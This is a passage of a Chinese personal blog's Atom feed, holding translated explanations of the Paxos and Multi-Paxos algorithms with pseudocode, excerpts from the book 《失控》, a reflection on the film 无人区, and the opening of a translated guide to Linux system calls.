&lt;p&gt;[Lamport论文中对Paxos算法的描述是出了名的晦涩难懂，也由于Paxos算法本身的复杂性，以至于让Lamport每次都得解释好几遍。故挑选几篇对Paxos算法描述比较浅显易懂的博客翻译，希望能对大家理解Paxos算法有那么一点点帮助&lt;/p&gt;
&lt;p&gt;译者水平有限，对Paxos算法的理解离Lamport大师本人要表达的精髓还相差甚远，如有不对的地方，请一定要指出]&lt;/p&gt;
&lt;p&gt;本文遵守Attribution-NonCommercial-NoDerivatives 4.0 International License (CC BY-NC-ND 4.0)&lt;/p&gt;
&lt;p&gt;译文，仅为学习使用，未经博主同意，请勿转载。&lt;/p&gt;
&lt;p&gt;原文地址：&lt;a href=&quot;https://distributedthoughts.wordpress.com/2013/09/22/understanding-paxos-part-1/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://distributedthoughts.wordpress.com/2013/09/22/understanding-paxos-part-1/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本文地址： &lt;a href=&quot;http://www.chongh.wiki/blog/2016/04/28/understand-paxos1/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.chongh.wiki/blog/2016/04/28/understand-paxos1/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;译者 [ 新浪微博: &lt;a href=&quot;http://weibo.com/2767520802/profile?rightmod=1&amp;amp;wvr=6&amp;amp;mod=personinfo&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;@diting0x&lt;/a&gt;]，感谢好友&lt;a href=&quot;http://weibo.com/u/2765244861?topnav=1&amp;amp;wvr=6&amp;amp;topsug=1&amp;amp;is_all=1&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;@睡眼惺忪的小叶先生&lt;/a&gt;与我几次激烈的讨论，对本文很有帮助&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;我第一次听说Paxos算法是在2004年，&lt;/p&gt;
    
    </summary>
    
      <category term="Algorithm" scheme="http://yoursite.com/categories/Algorithm/"/>
    
    
      <category term="Distributed" scheme="http://yoursite.com/tags/Distributed/"/>
    
      <category term="Algorithm" scheme="http://yoursite.com/tags/Algorithm/"/>
    
  </entry>
  
  <entry>
    <title>Paxos/Mutil-paxos 算法浅析</title>
    <link href="http://yoursite.com/blog/2016/04/27/paxos-mutilpaxos/"/>
    <id>http://yoursite.com/blog/2016/04/27/paxos-mutilpaxos/</id>
    <published>2016-04-28T00:48:54.000Z</published>
    <updated>2016-04-30T04:27:15.000Z</updated>
    
    <content type="html">&lt;p&gt;在前几篇博客中，讨论了我在伯克利最后一学期修的分布式系统编程课程中的内容。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt; 
&lt;p&gt;那时我参与的项目太酷了- 我们组一步步完成了从quorum KVS到分布式锁管理，又实现了Multi-paxos算法作为我们最终提交的项目。这篇博客，我会从普通的Paxos算法说起。&lt;/p&gt;
&lt;p&gt;简单来说，Paxos是将一组节点在单个值上达成一致的协议(严格来说，是指一个协议簇，这是 &lt;a href=&quot;https://en.wikipedia.org/wiki/Paxos_\(computer_science&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;维基百科&lt;/a&gt; 上的说法)&lt;/p&gt;
&lt;h3 id=&quot;Paxos算法为什么重要？&quot;&gt;&lt;a href=&quot;#Paxos算法为什么重要？&quot; class=&quot;headerlink&quot; title=&quot;Paxos算法为什么重要？&quot;&gt;&lt;/a&gt;Paxos算法为什么重要？&lt;/h3&gt;&lt;p&gt;如果有一个固定的的master节点，master节点就可以自己决策并提案值，让其它节点跟着使用这个值就行，那Paxos算法就没有任何用武之地了。倘若决策者的选举失败（有时就会这样），这时有两个节点提案值呢？&lt;/p&gt;
&lt;p&gt;Paxos算法能保证在所有提案的值中选出一个唯一的值。当你想在分布式系统中的一系列值中做决策时，或者说，在这一系列的值中决策出一致的顺序，Paxos算法就派上用场了。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[译者注]：分布式系统中要保证日志的一致性，往往要决策哪个值才能真正被写入到各节点中的日志中以保证每个节点的日志记录的条目是相同的
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;像&lt;a href=&quot;https://ayende.com/blog/4496/paxos-enlightment&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Ayende Rahien&lt;/a&gt;描述的那样，如果这些值是指一些事件，那在一个集群中所有的机器都能保持相同的状态或者状态的子集。&lt;/p&gt;
&lt;h3 id=&quot;Paxos-算法&quot;&gt;&lt;a href=&quot;#Paxos-算法&quot; class=&quot;headerlink&quot; title=&quot;Paxos 算法&quot;&gt;&lt;/a&gt;Paxos 算法&lt;/h3&gt;&lt;p&gt;Paxos算法分两个阶段进行，准备阶段(Prepare Phase）与批准阶段（Accept Phase)。&lt;/p&gt;
&lt;p&gt;声明：下面章节的一些用词部分来源于Leslie Lamport的论文： &lt;a href=&quot;http://research.microsoft.com/en-us/um/people/lamport/pubs/paxos-%20simple.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Paxo Made Simple&lt;/a&gt;.&lt;/p&gt;
&lt;h4 id=&quot;准备阶段&quot;&gt;&lt;a href=&quot;#准备阶段&quot; class=&quot;headerlink&quot; title=&quot;准备阶段&quot;&gt;&lt;/a&gt;准备阶段&lt;/h4&gt;&lt;p&gt;在准备阶段，提案者（proposor)选出一个提案编号 &lt;code&gt;n&lt;/code&gt; (此编号比提案者之前发送出的任何一个 编号都要大，也与任何其他提案者的编号 不同，将在下面详细讨论)，然后发送一个 &lt;code&gt;PREPARE&lt;/code&gt; 请求给批准者的多数派。&lt;/p&gt;
&lt;p&gt;对批准者（acceptor)来说，如果收到的 &lt;code&gt;PREPARE&lt;/code&gt; 请求中的提案编号 &lt;code&gt;n&lt;/code&gt; 比它之前收到的任何提案编号都要大，就会响应一个“承诺”  (promise)，指出之后不会回应任何一个比这个提案编号要小的编号,以及已经收到过的最大提案编号(如果有的话).&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[译者注]:一个节点可以同时担任提案者与批准者；另外，注意这里的编号大小决定着此次提案的优先级
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;开始听起来有点困惑了？&lt;/p&gt;
&lt;p&gt;在真正理解前我也读了好几遍，再看看下面的伪代码也许会有所帮助。&lt;/p&gt;
&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;# Proposer&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; acceptor in acceptors&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  send :prepare_req, next_n()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;# Acceptor&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (req.n &amp;gt; highest_proposed_n)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  highest_proposed_n = req.n&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  reply :prepare_resp, &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    :n =&amp;gt; highest_acc.n,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    :value =&amp;gt; highest_acc.value&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&quot;批准阶段&quot;&gt;&lt;a href=&quot;#批准阶段&quot; class=&quot;headerlink&quot; title=&quot;批准阶段&quot;&gt;&lt;/a&gt;批准阶段&lt;/h4&gt;&lt;p&gt;当提案者收到批准者中多数派对 &lt;code&gt;PREPARE&lt;/code&gt; 请求的响应后，给批准者发送一个含有值 &lt;code&gt;v&lt;/code&gt; 的 &lt;code&gt;ACCEPT&lt;/code&gt; 信号，&lt;code&gt;v&lt;/code&gt; 是收到的响应中最高提案编号中的值，当响应中没有任何批准的值时，&lt;code&gt;v&lt;/code&gt; 可以是任意值。&lt;/p&gt;
&lt;p&gt;当批准者收到 &lt;code&gt;ACCEPT&lt;/code&gt; 请求时，总会接收这个请求，除非它已经在准备阶段承诺过不再接收任何请求。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[译者注]：注意，提案编号和提案值是不同的，类似于&amp;lt;key,value&amp;gt;的关系
&lt;/code&gt;&lt;/pre&gt;&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;# Proposer&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; acceptor in acceptors&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  send :accept_req, responses.argmax &amp;#123; |i| i.n &amp;#125;.value &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;# Acceptor&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (req.n &amp;gt;= highest_proposed_n)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  highest_acc = &amp;#123;:n =&amp;gt; req.n, :value =&amp;gt; req.value&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  reply :accept_resp&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;Mutil-Paxos-算法&quot;&gt;&lt;a href=&quot;#Mutil-Paxos-算法&quot; class=&quot;headerlink&quot; title=&quot;Mutil-Paxos 算法&quot;&gt;&lt;/a&gt;Mutil-Paxos 算法&lt;/h3&gt;&lt;p&gt;上面所讲的是 Paxos 算法。那 Multi-paxos 算法是如何工作的呢？&lt;/p&gt;
&lt;p&gt;前面提到，Paxos 算法最主要的应用在于，能让许多参与者在一系列列数值中做出决策。当Paxos算法结束运行一轮后，会生成一个提案值 &lt;code&gt;v&lt;/code&gt; ，要决策出一系列的提案值来，最简单的方法就是多次运行 Paxos 算法，对不对？&lt;/p&gt;
&lt;p&gt;实际上这种情况可以对 Paxos 算法进行优化： 设定一个固定的决策者，可以用来跳过准备阶段。假定这种决策关系能够保持”粘性”，就没必要继续发出提案编号—第一个被发送的提案号始终不会被覆盖，因为这时只有一个决策者。&lt;/p&gt;
&lt;p&gt;因此，我们只需要运行一次准备阶段就够了。在 Paxos 算法接下来的几轮中，我们只需要发送 &lt;code&gt;ACCEPT&lt;/code&gt; 消息，附带一个在原始 &lt;code&gt;PREPARE&lt;/code&gt; 请求中用过的提案编号 &lt;code&gt;n&lt;/code&gt; ,和一个额外的参数来表示我们正在运行的轮数序列号。最坏的情况不过是决策关系不是固定的(或者说不是唯一的),这时我们也不必担心，因为算法会自动降级到普通的Paxos算法中(每一轮过程中都有准备阶段和批准阶段）。好酷！&lt;/p&gt;
&lt;h3 id=&quot;其它考虑&quot;&gt;&lt;a href=&quot;#其它考虑&quot; class=&quot;headerlink&quot; title=&quot;其它考虑&quot;&gt;&lt;/a&gt;其它考虑&lt;/h3&gt;&lt;h4 id=&quot;永久存储&quot;&gt;&lt;a href=&quot;#永久存储&quot; class=&quot;headerlink&quot; title=&quot;永久存储&quot;&gt;&lt;/a&gt;永久存储&lt;/h4&gt;&lt;p&gt;系统必须保证一些数据能永久存储，以防能从失效中恢复。&lt;br&gt;尤其是，批准者需要记住它们承诺过要响应哪个 &lt;code&gt;PREPARE&lt;/code&gt; 请求以及它们响应过的 &lt;code&gt;ACCEPT&lt;/code&gt; 请求，这样做是为了决策出要承诺哪个提案并能传递一些必要的信息反馈给此提案。&lt;/p&gt;
&lt;h4 id=&quot;唯一的提案编号-n&quot;&gt;&lt;a href=&quot;#唯一的提案编号-n&quot; class=&quot;headerlink&quot; title=&quot;唯一的提案编号 n&quot;&gt;&lt;/a&gt;唯一的提案编号 &lt;code&gt;n&lt;/code&gt;&lt;/h4&gt;&lt;p&gt;为了能让算法正常工作，每个提案者必须递增地增加提案编号 &lt;code&gt;n&lt;/code&gt;，&lt;code&gt;n&lt;/code&gt; 必须不同于其它任何提案者的编号.&lt;/p&gt;
&lt;p&gt;为了满足这个条件，我们为每个提案者分配一个互斥的数值集合，并让它们只能从自己的集合中选取编号（比如说，给每个节点分配一个单独的素数，它们可以选择素数的不同倍数作为一个集合）&lt;/p&gt;
&lt;p&gt;或者，我们也可以设定参与者成员的静态属性，为每个节点分配一个从0到 &lt;code&gt;k&lt;/code&gt; 之间的唯一数值&lt;code&gt;i&lt;/code&gt;，&lt;code&gt;k&lt;/code&gt; 是参与者的总数，&lt;code&gt;n=i+(k*轮数)&lt;/code&gt;.&lt;/p&gt;
&lt;h3 id=&quot;结论&quot;&gt;&lt;a href=&quot;#结论&quot; class=&quot;headerlink&quot; title=&quot;结论&quot;&gt;&lt;/a&gt;结论&lt;/h3&gt;&lt;p&gt;长话短说: Paxos 算法的目标是能让集群中的机器在一个提案值上最终达到统一（或者更有用的情况是，能为一系列数值决策出一致的顺序）。Multi-paxos 算法是对连续许多轮执行 Paxos 算法的一种优化，如果你设定了一个决策者，就可以跳过其中的一个阶段。&lt;/p&gt;
&lt;p&gt;希望这篇博客能对你有用。我不是这个领域的专家，所以希望能听到更多的评论与修正。&lt;/p&gt;
&lt;p&gt;若有兴趣，可继续阅读&lt;a href=&quot;http://www.chongh.wiki/blog/2016/04/28/understand-paxos1/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;下一篇&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;Acknowledgement&quot;&gt;&lt;a href=&quot;#Acknowledgement&quot; class=&quot;headerlink&quot; title=&quot;Acknowledgement&quot;&gt;&lt;/a&gt;Acknowledgement&lt;/h3&gt;&lt;p&gt;注：[特别重要]&lt;/p&gt;
&lt;p&gt;[Lamport论文中对Paxos算法的描述是出了名的晦涩难懂，也由于Paxos算法本身的复杂性，以至于让Lamport每次都得解释好几遍。故挑选几篇对Paxos算法描述比较浅显易懂的博客翻译，希望能对大家理解Paxos算法有那么一点点帮助&lt;/p&gt;
&lt;p&gt;译者水平有限，对Paxos算法的理解离Lamport大师本人要表达的精髓还相差甚远，如有不对的地方，请一定要指出]&lt;/p&gt;
&lt;p&gt;本文遵守Attribution-NonCommercial-NoDerivatives 4.0 International License (CC BY-NC-ND 4.0)&lt;/p&gt;
&lt;p&gt;译文，仅为学习使用，未经博主同意，请勿转载。&lt;/p&gt;
&lt;p&gt;原英文地址：&lt;a href=&quot;http://amberonrails.com/paxosmulti-paxos-algorithm/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://amberonrails.com/paxosmulti-paxos-algorithm/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本文地址： &lt;a href=&quot;http://www.chongh.wiki/blog/2016/04/27/paxos-mutilpaxos/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.chongh.wiki/blog/2016/04/27/paxos-mutilpaxos/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;译者 [ 新浪微博: &lt;a href=&quot;http://weibo.com/2767520802/profile?rightmod=1&amp;amp;wvr=6&amp;amp;mod=personinfo&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;@diting0x&lt;/a&gt;]，感谢好友&lt;a href=&quot;http://weibo.com/u/2765244861?topnav=1&amp;amp;wvr=6&amp;amp;topsug=1&amp;amp;is_all=1&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;@睡眼惺忪的小叶先生&lt;/a&gt;与我几次激烈的讨论，对本文很有帮助&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;在前几篇博客中，讨论了我在伯克利最后一学期修的分布式系统编程课程中的内容。&lt;/p&gt;
    
    </summary>
    
      <category term="Algorithm" scheme="http://yoursite.com/categories/Algorithm/"/>
    
    
      <category term="Distributed" scheme="http://yoursite.com/tags/Distributed/"/>
    
      <category term="Algorithm" scheme="http://yoursite.com/tags/Algorithm/"/>
    
  </entry>
  
  <entry>
    <title>新生物文明与蜂群思维</title>
    <link href="http://yoursite.com/blog/2016/04/26/shikongnote1/"/>
    <id>http://yoursite.com/blog/2016/04/26/shikongnote1/</id>
    <published>2016-04-26T16:56:01.000Z</published>
    <updated>2016-04-26T16:59:08.000Z</updated>
    
    <content type="html">&lt;p&gt;新生物文明&lt;/p&gt;
&lt;p&gt;机器，正在生物化；而生物，正在工程化。&lt;br&gt;这种趋势正验证着某些古老的隐喻–将机器比喻为生物，将生物比喻为机器。哪些比喻由来已久，古老到第一台机器诞生之时。如今，哪些久远的隐喻不再只是诗意的遐想，它们正在变为现实–一种积极有益的现实。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;由于我们自己创造的这个世界变得过于负责，我们不得不求助于自然世界以了解管理它的方法。这也就意味着，想要保证一切正常运转，我们最终制造出来的环境越机械化，可能越需要生物化。我们的未来是技术性的，但这并不意味着未来世界一定会是灰色冰冷的钢铁世界。相反，我们的技术所引导的未来，朝向的正是一种新生物文明。&lt;/p&gt;
&lt;p&gt;生物逻辑的胜利&lt;/p&gt;
&lt;p&gt;[机械]与[生命]这两个词的含义在不断延生，直到某一天，所有结构复杂的东西都被看作是机器，而所有能够自维持的机器都被看作是有生命的。&lt;/p&gt;
&lt;p&gt;学会向我们的创造物低头&lt;/p&gt;
&lt;p&gt;人造世界就像天然世界一样，很快就会具有自制力、适应力以及创造力，也随之失去我们的控制。但在我看来，这却是个最美妙的结局。&lt;/p&gt;
&lt;p&gt;蜂群思维  &lt;/p&gt;
&lt;p&gt;蜂群是彻底的母权制，而且是姐妹关系：除了少数无用的雄峰，所有的蜜蜂都是雌性姐妹。蜂群曾经如同日蚀一样神秘、一样深不可测。&lt;/p&gt;
&lt;p&gt;蜂群的灵魂在哪里，它在何处主流？&lt;br&gt;这里由谁统治，由谁发布命令，由谁遇见未来？&lt;/p&gt;
&lt;p&gt;这是一个白痴的选举大厅，由白痴选举白痴，其产生的效果却极为惊人。这是民主制度的精髓，是彻底的分布式管理。&lt;/p&gt;
&lt;p&gt;活系统的普遍规律：底层及的存在无法推断出高层级的负载型。不管是计算机还是大脑，也不管事哪一种方法–数学、物理或哲学–如果不实际运行它，就无法解释融于个体部分的涌现模式。只有实际存在的蜂群才能解释单个蜜蜂体内是否融合着蜂群特性。&lt;/p&gt;
&lt;p&gt;记忆是高度重建的。在记忆中进行抽取，需要从数目庞大的事件中挑选出什么是重要的，什么是不重要的，强调重要的东西，忽略不重要的东西。这种选择的过程实际上就是感知。&lt;/p&gt;
&lt;p&gt;-摘录自《失控》&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;新生物文明&lt;/p&gt;
&lt;p&gt;机器，正在生物化；而生物，正在工程化。&lt;br&gt;这种趋势正验证着某些古老的隐喻–将机器比喻为生物，将生物比喻为机器。哪些比喻由来已久，古老到第一台机器诞生之时。如今，哪些久远的隐喻不再只是诗意的遐想，它们正在变为现实–一种积极有益的现实。&lt;/p&gt;
    
    </summary>
    
      <category term="Misc" scheme="http://yoursite.com/categories/Misc/"/>
    
    
  </entry>
  
  <entry>
    <title>电影无人区的思考</title>
    <link href="http://yoursite.com/blog/2016/04/22/wurenqu/"/>
    <id>http://yoursite.com/blog/2016/04/22/wurenqu/</id>
    <published>2016-04-22T06:39:20.000Z</published>
    <updated>2016-04-26T19:29:28.000Z</updated>
    
    <content type="html">&lt;p&gt;从大学起就听说过宁浩的无人区，那时候还是2009年，就期待着这部想像中的‘黑色幽默’。可是时间一晃，便迟到了四年，也早耗费了我整个大学时光。不知不觉，随我到了北京，13年上映，那时便立马看了首映。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;今天是2016年，又一个三年，这是我第三次看这部电影，而这时候，却身处美国的一个中西部农村。这种黑色、公路片对我一直有巨大的诱惑力，之前看过《两杆大烟枪》、《老无所依》、《不准掉头》、《偷拐抢骗》、《杀手没有假期》，还有宁浩的疯狂系列，都非常喜欢。&lt;/p&gt;
&lt;p&gt;黑色让人沉思，公路让人浮想联翩。想找个假期能狂奔在美国西部的公路上，没有尽头，去体验那种放肆。&lt;/p&gt;
&lt;p&gt;无人区，这里没有人，只有动物。&lt;br&gt;一个没有人的区域，没有法律、没有道德、没有人情，只有生物本能的生与死、苦与乐。&lt;br&gt;而人与动物的区别，就是，人会用火。&lt;br&gt;火可以用来取暖，炙热情感。就像电影中的潘肖，牺牲自己也要让她把这个故事带出去。&lt;/p&gt;
&lt;p&gt;好温馨的表达，人会用火。多点燃你心中的火，多温暖你身边的人。&lt;/p&gt;
&lt;p&gt;突然用电影来表达这些，实在是太不和谐。&lt;/p&gt;
&lt;p&gt;完&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;从大学起就听说过宁浩的无人区，那时候还是2009年，就期待着这部想像中的‘黑色幽默’。可是时间一晃，便迟到了四年，也早耗费了我整个大学时光。不知不觉，随我到了北京，13年上映，那时便立马看了首映。&lt;/p&gt;
    
    </summary>
    
      <category term="Misc" scheme="http://yoursite.com/categories/Misc/"/>
    
    
      <category term="Life" scheme="http://yoursite.com/tags/Life/"/>
    
      <category term="Movie" scheme="http://yoursite.com/tags/Movie/"/>
    
  </entry>
  
  <entry>
    <title>Linux系统调用权威指南</title>
    <link href="http://yoursite.com/blog/2016/04/08/linux-syscalls/"/>
    <id>http://yoursite.com/blog/2016/04/08/linux-syscalls/</id>
    <published>2016-04-08T21:08:08.000Z</published>
    <updated>2016-05-16T23:59:26.000Z</updated>
    
    <content type="html">&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;长话短说（Too long;Don’t read)&lt;/li&gt;
&lt;li&gt;什么是系统调用&lt;/li&gt;
&lt;li&gt;准备知识&lt;ul&gt;
&lt;li&gt;硬件与软件&lt;/li&gt;
&lt;li&gt;用户程序，内核与CPU特权级&lt;/li&gt;
&lt;li&gt;中断&lt;/li&gt;
&lt;li&gt;特殊模块寄存器&lt;/li&gt;
&lt;li&gt;编写汇编代码触发系统调用不是个好主意&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;传统系统调用&lt;ul&gt;
&lt;li&gt;自己写汇编代码使用传统系统调用&lt;/li&gt;
&lt;li&gt;内核层面：&lt;code&gt;int $0x80&lt;/code&gt;入口&lt;/li&gt;
&lt;li&gt;&lt;code&gt;iret&lt;/code&gt;: 从传统系统调用返回&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;快速系统调用&lt;ul&gt;
&lt;li&gt;32位快速系统调用&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sysenter/sysexit&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;_ _kernel_vsyscall&lt;/code&gt;内幕&lt;/li&gt;
&lt;li&gt;自己写汇编代码使用&lt;code&gt;sysenter&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;内核层面：&lt;code&gt;sysenter&lt;/code&gt;入口&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sysexit&lt;/code&gt;: 从&lt;code&gt;sysenter&lt;/code&gt;中返回&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;64位快速系统调用&lt;ul&gt;
&lt;li&gt;&lt;code&gt;syscall/sysret&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;自己写汇编代码使用syscall&lt;/li&gt;
&lt;li&gt;内核层面：&lt;code&gt;syscall&lt;/code&gt;入口&lt;/li&gt;
&lt;li&gt;sysret: 从syscall中返回&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;syscall(2)：半手动调用syscall&lt;ul&gt;
&lt;li&gt;glibc &lt;code&gt;syscall&lt;/code&gt;封装器内幕&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;虚拟系统调用&lt;ul&gt;
&lt;li&gt;内核中的vDSO&lt;/li&gt;
&lt;li&gt;在内存中定位vDSO&lt;/li&gt;
&lt;li&gt;glibc中的vDSO&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;glibc&lt;/code&gt;系统调用封装器&lt;/li&gt;
&lt;li&gt;重要的syscall相关bugs&lt;ul&gt;
&lt;li&gt;CVE-2010-3301&lt;/li&gt;
&lt;li&gt;Android &lt;code&gt;sysenter&lt;/code&gt; ABI 破坏&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;结论&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;长话短说-Too-long-Don’t-read&quot;&gt;&lt;a href=&quot;#长话短说-Too-long-Don’t-read&quot; class=&quot;headerlink&quot; title=&quot;长话短说(Too long; Don’t read)&quot;&gt;&lt;/a&gt;长话短说(Too long; Don’t read)&lt;/h2&gt;&lt;p&gt;文章解释了Linux程序在内核中是如何调用函数的。&lt;/p&gt;
&lt;p&gt;读完你可以知道：触发系统调用的不同方法，如何编写汇编代码触发系统调用(含代码样例), 内核执行系统调用的入口，内核从系统调用返回的出口，glibc封装器，相关bugs，还有更多，更多。&lt;/p&gt;
&lt;h2 id=&quot;什么是系统调用？&quot;&gt;&lt;a href=&quot;#什么是系统调用？&quot; class=&quot;headerlink&quot; title=&quot;什么是系统调用？&quot;&gt;&lt;/a&gt;什么是系统调用？&lt;/h2&gt;&lt;p&gt;当你运行的程序调用 open,fork,read,write（以及其它类似的函数)时,就会触发系统调用。&lt;/p&gt;
&lt;p&gt;系统调用描述的是用户程序进入内核后执行的任务。用户程序利用系统调用能执行许多操作：创建进程、网络、文件以及I/O操作等。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://man7.org/linux/man-pages/man2/syscalls.2.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;man page for syscalls(2)&lt;/a&gt; 列出了全部系统调用。&lt;/p&gt;
&lt;p&gt;用户程序可以通过不同的方式执行系统调用，不同CPU架构中，底层执行系统调用的指令也有所不同。&lt;/p&gt;
&lt;p&gt;作为应用程序开发者，不必刻意去考虑系统调用是如何执行的。你只需要简单的加上合适的头文件，像调用普通函数一样就可以使用系统调用了。&lt;/p&gt;
&lt;p&gt;glibc提供了封装代码将底层抽象，把你传递的参数放置好之后开始进入内核。&lt;/p&gt;
&lt;p&gt;在深入理解系统调用执行的细节之前，我们需要定义一些术语，再谈一谈后面要用到的核心知识点。&lt;/p&gt;
